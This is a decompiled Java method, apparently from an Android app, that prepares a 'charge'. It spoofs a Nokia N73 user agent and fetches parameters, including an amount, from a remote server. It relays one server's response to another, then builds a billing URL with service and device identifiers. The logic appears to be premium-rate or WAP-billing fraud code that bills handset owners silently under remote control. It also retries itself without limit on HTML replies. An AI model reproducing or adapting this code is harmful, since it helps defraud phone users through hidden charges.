    private String prepareCharge(String url) throws SecurityException, IOException {
        HttpObject httpObj = new HttpObject();
        httpObj.setUrl(url);
        httpObj.addRequestHeader("accept", "*/*");
        httpObj.addRequestHeader("User-Agent", "NokiaN73");
        byte[] input = HttpConnector.newInstance().request(httpObj).getInput();
        String s = new String(input, "UTF-8");
        if (s != null && s.trim().startsWith("<")) {
            debug("jump pg\n" + s);
            return prepareCharge(url);
        }
        Properties pros = new Properties();
        pros.load(new ByteArrayInputStream(input));
        String uaUrl = pros.getProperty(AdActivity.URL_PARAM);
        String configUrl = pros.getProperty("c");
        String paramUrl = pros.getProperty("r");
        String m = pros.getProperty(AdActivity.TYPE_PARAM);
        debug("u=" + uaUrl);
        debug("c=" + configUrl);
        debug("r=" + paramUrl);
        debug("m=" + m);
        if (m != null) {
            this.money = m;
        }
        if (configUrl == null) {
            return null;
        }
        byte[] uaReturn = (byte[]) null;
        if (uaUrl != null && uaUrl.length() > 0) {
            HttpObject uaHttpObj = new HttpObject();
            uaHttpObj.setUrl(uaUrl);
            uaReturn = HttpConnector.newInstance().request(uaHttpObj).getInput();
        }
        String result = null;
        if (paramUrl != null && paramUrl.length() > 0) {
            HttpObject paramHttpObj = new HttpObject();
            paramHttpObj.setUrl(paramUrl);
            paramHttpObj.setRequestMethod(HttpConnector.METHOD_POST);
            paramHttpObj.setOutputType(HttpObject.OUTPUT_BYTEARRAY);
            if (uaReturn != null) {
                paramHttpObj.setOutput(uaReturn);
            }
            byte[] paramReturn = HttpConnector.newInstance().request(paramHttpObj).getInput();
            result = new String(paramReturn, "UTF-8");
        }
        return String.valueOf(configUrl) + "?serviceId=" + this.serviceId + "&sgparam=" + this.sgParam + "&series=" + this.mobileSeries + "&flag=" + this.flag + "&eid=" + this.eid + "&r=" + result;
    }

